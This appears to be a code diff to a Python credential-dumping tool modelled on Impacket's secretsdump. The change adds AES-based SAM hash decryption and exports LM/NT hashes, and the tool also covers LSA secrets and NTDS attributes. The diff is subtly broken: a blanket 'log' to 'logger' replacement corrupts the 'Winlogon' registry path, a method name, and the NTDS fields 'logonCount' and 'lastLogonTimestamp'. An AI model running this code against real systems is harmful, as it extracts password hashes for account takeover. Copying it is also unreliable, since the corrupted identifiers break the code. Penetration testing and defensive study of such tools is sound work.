@@ -8,10 +8,15 @@ import hashlib
 import sys
 import string
 import ntpath
+from binascii import hexlify
 from struct import pack
+
+from impacket.smbserver import openFile
+
 from lib.common import DataStore, RemoteFile
 from lib.structures import (DOMAIN_ACCOUNT_F, USER_ACCOUNT_V, LSA_SECRET_XP,
-                            LSA_SECRET, LSA_SECRET_BLOB, NL_RECORD, SAMR_RPC_SID)
+                            LSA_SECRET, LSA_SECRET_BLOB, NL_RECORD, SAMR_RPC_SID,
+                            SAM_KEY_DATA, SAM_HASH, SAM_HASH_AES, SAM_KEY_DATA_AES)
 from lib.logger import logger
 from lib.exceptions import registryKey
 
@@ -222,10 +227,10 @@ class RemoteOperations:
 
         return remote_fp
 
-    def get_default_login_account(self):
+    def get_default_loggerin_account(self):
         try:
             ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle,
-                                      'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
+                                      'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winloggeron')
             keyHandle = ans['phkResult']
             dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
             username = dataValue[:-1]
@@ -348,67 +353,85 @@ class OfflineRegistry:
 
 
 class SAMHashes(OfflineRegistry):
-    def __init__(self, samFile, bootKey):
-        OfflineRegistry.__init__(self, samFile)
+    def __init__(self, samFile, bootKey, isRemote=False, perSecretCallback=lambda secret: _print_helper(secret)):
+        OfflineRegistry.__init__(self, samFile, isRemote)
         self.__samFile = samFile
-        self.__hashedBootKey = ''
+        self.__hashedBootKey = b''
         self.__bootKey = bootKey
         self.__cryptoCommon = CryptoCommon()
         self.__itemsFound = {}
+        self.__perSecretCallback = perSecretCallback
 
-    def __getHBootKey(self):
+    def MD5(self, data):
+        md5 = hashlib.new('md5')
+        md5.update(data)
+        return md5.digest()
+
+    def getHBootKey(self):
         logger.debug('Calculating HashedBootKey from SAM')
-        QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
-        DIGITS = "0123456789012345678901234567890123456789\0"
+        QWERTY = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
+        DIGITS = b"0123456789012345678901234567890123456789\0"
 
-        F = self.getValue(ntpath.join('SAM\Domains\Account', 'F'))[1]
-        logger.info('Got F')
+        F = self.getValue(ntpath.join(r'SAM\Domains\Account', 'F'))[1]
+
         domainData = DOMAIN_ACCOUNT_F(F)
-        logger.info('Added F to DOMAIN_ACCOUNT structure')
 
-        rc4Key = MD5(domainData['Key0']['Salt'] + QWERTY + self.__bootKey + DIGITS)
-        logger.info('Got rc4key')
-        rc4 = ARC4.new(rc4Key)
-        logger.info('Added rc4key to rc4')
-        self.__hashedBootKey = rc4.encrypt(domainData['Key0']['Key'] + domainData['Key0']['CheckSum'])
-        logger.info('Created hashedBootKey')
-        # Verify key with checksum
-        checkSum = MD5(self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)
-        logger.info('Got checkSum')
-        if checkSum != self.__hashedBootKey[16:]:
-            raise Exception('hashedBootKey CheckSum failed')
+        if domainData['Key0'][0:1] == b'\x01':
+            samKeyData = SAM_KEY_DATA(domainData['Key0'])
 
-    def __decryptHash(self, rid, cryptedHash, constant):
+            rc4Key = self.MD5(samKeyData['Salt'] + QWERTY + self.__bootKey + DIGITS)
+            rc4 = ARC4.new(rc4Key)
+            self.__hashedBootKey = rc4.encrypt(samKeyData['Key'] + samKeyData['CheckSum'])
+
+            # Verify key with checksum
+            checkSum = self.MD5(self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)
+
+            if checkSum != self.__hashedBootKey[16:]:
+                raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')
+
+        elif domainData['Key0'][0:1] == b'\x02':
+            # This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also)
+            samKeyData = SAM_KEY_DATA_AES(domainData['Key0'])
+
+            self.__hashedBootKey = self.__cryptoCommon.decryptAES(self.__bootKey,
+                                                                  samKeyData['Data'][:samKeyData['DataLen']],
+                                                                  samKeyData['Salt'])
+
+    def __decryptHash(self, rid, cryptedHash, constant, newStyle=False):
         # Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
         # plus hashedBootKey stuff
         Key1, Key2 = self.__cryptoCommon.deriveKey(rid)
+
         Crypt1 = DES.new(Key1, DES.MODE_ECB)
         Crypt2 = DES.new(Key2, DES.MODE_ECB)
-        rc4Key = MD5(self.__hashedBootKey[:0x10] + pack("<L", rid) + constant)
-        rc4 = ARC4.new(rc4Key)
-        key = rc4.encrypt(cryptedHash)
+
+        if newStyle is False:
+            rc4Key = self.MD5(self.__hashedBootKey[:0x10] + pack("<L", rid) + constant)
+            rc4 = ARC4.new(rc4Key)
+            key = rc4.encrypt(cryptedHash['Hash'])
+        else:
+            key = self.__cryptoCommon.decryptAES(self.__hashedBootKey[:0x10], cryptedHash['Hash'], cryptedHash['Salt'])[
+                  :16]
+
         decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])
 
         return decryptedHash
 
-    def dumpSAM(self):
-        NTPASSWORD = 'NTPASSWORD\0'
-        LMPASSWORD = 'LMPASSWORD\0'
+    def dump(self):
+        NTPASSWORD = b"NTPASSWORD\0"
+        LMPASSWORD = b"LMPASSWORD\0"
 
         if self.__samFile is None:
             # No SAM file provided
             return
 
-        logger.info('Dumping local SAM hashes (UID:RID:LMhash:NThash), wait..')
-        self.__getHBootKey()
-        logger.info('Done getHBootKey')
+        logger.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
+        self.getHBootKey()
 
         usersKey = 'SAM\\Domains\\Account\\Users'
 
         # Enumerate all the RIDs
         rids = self.enumKey(usersKey)
-        logger.info('Done enumerating RIDs')
-
         # Remove the Names item
         try:
             rids.remove('Names')
@@ -418,44 +441,57 @@ class SAMHashes(OfflineRegistry):
         for rid in rids:
             userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey, rid, 'V'))[1])
             rid = int(rid, 16)
-            baseOffset = len(USER_ACCOUNT_V())
+
             V = userAccount['Data']
+
             userName = V[userAccount['NameOffset']:userAccount['NameOffset'] + userAccount['NameLength']].decode(
                 'utf-16le')
 
-            if userAccount['LMHashLength'] == 20:
-                encLMHash = V[userAccount['LMHashOffset'] + 4:userAccount['LMHashOffset'] + userAccount['LMHashLength']]
+            encNTHash = b''
+            if V[userAccount['NTHashOffset']:][2:3] == b'\x01':
+                # Old Style hashes
+                newStyle = False
+                if userAccount['LMHashLength'] == 20:
+                    encLMHash = SAM_HASH(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
+                if userAccount['NTHashLength'] == 20:
+                    encNTHash = SAM_HASH(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])
             else:
-                encLMHash = ''
+                # New Style hashes
+                newStyle = True
+                if userAccount['LMHashLength'] == 24:
+                    encLMHash = SAM_HASH_AES(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
+                encNTHash = SAM_HASH_AES(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])
 
-            if userAccount['NTHashLength'] == 20:
-                encNTHash = V[userAccount['NTHashOffset'] + 4:userAccount['NTHashOffset'] + userAccount['NTHashLength']]
+            logger.debug('NewStyle hashes is: %s' % newStyle)
+            if userAccount['LMHashLength'] >= 20:
+                lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD, newStyle)
             else:
-                encNTHash = ''
+                lmHash = b''
 
-            lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD)
-            ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD)
+            if encNTHash != b'':
+                ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD, newStyle)
+            else:
+                ntHash = b''
 
-            if lmHash == '':
+            if lmHash == b'':
                 lmHash = ntlm.LMOWFv1('', '')
-
-            if ntHash == '':
+            if ntHash == b'':
                 ntHash = ntlm.NTOWFv1('', '')
 
-            answer = "%s:%d:%s:%s:::" % (userName, rid, lmHash.encode('hex'), ntHash.encode('hex'))
+            answer = "%s:%d:%s:%s:::" % (
+            userName, rid, hexlify(lmHash).decode('utf-8'), hexlify(ntHash).decode('utf-8'))
             self.__itemsFound[rid] = answer
+            self.__perSecretCallback(answer)
 
-            print answer
-
-    def exportSAM(self):
+    def export(self, baseFileName, openFileFunc=None):
         if len(self.__itemsFound) > 0:
             items = sorted(self.__itemsFound)
-            fd = open('%s-sam.txt' % DataStore.server_host, 'w+')
-
+            fileName = baseFileName + '.sam'
+            fd = openFile(fileName, openFileFunc=openFileFunc)
             for item in items:
-                fd.write('%s\n' % self.__itemsFound[item])
-
+                fd.write(self.__itemsFound[item] + '\n')
             fd.close()
+            return fileName
 
 
 class LSASecrets(OfflineRegistry):
@@ -594,7 +630,7 @@ class LSASecrets(OfflineRegistry):
             # No SECURITY file provided
             return
 
-        logger.info('Dumping cached domain logon information (UID:encryptedHash:longDomain:domain), wait..')
+        logger.info('Dumping cached domain loggeron information (UID:encryptedHash:longDomain:domain), wait..')
 
         # Let's first see if there are cached entries
         values = self.enumValues('\\Cache')
@@ -674,7 +710,7 @@ class LSASecrets(OfflineRegistry):
                 secret += strDecoded
 
         elif upperName.startswith('DEFAULTPASSWORD'):
-            # defaults password for winlogon
+            # defaults password for winloggeron
             # Let's first try to decode the secret
             try:
                 strDecoded = secretItem.decode('utf-16le')
@@ -682,7 +718,7 @@ class LSASecrets(OfflineRegistry):
                 pass
             else:
                 # We have to get the account this password is for
-                account = self.get_default_login_account()
+                account = self.get_default_loggerin_account()
 
                 if account is None:
                     secret = '(Unknown User) '
@@ -779,10 +815,10 @@ class NTDSHashes(object):
         'userAccountControl': 'ATTj589832',
         'primaryGroupID': 'ATTj589922',
         'accountExpires': 'ATTq589983',
-        'logonCount': 'ATTj589993',
+        'loggeronCount': 'ATTj589993',
         'sAMAccountName': 'ATTm590045',
         'sAMAccountType': 'ATTj590126',
-        'lastLogonTimestamp': 'ATTq589876',
+        'lastloggeronTimestamp': 'ATTq589876',
         'userPrincipalName': 'ATTm590480',
         'unicodePwd': 'ATTk589914',
         'dBCSPwd': 'ATTk589879',
@@ -1050,3 +1086,7 @@ class SecretsDump(RemoteOperations, SAMHashes, LSASecrets, NTDSHashes):
     def cleanup(self):
         logger.info('Cleaning up..')
         self.finish()
+
+
+def _print_helper(*args, **kwargs):
+    print(args[-1])
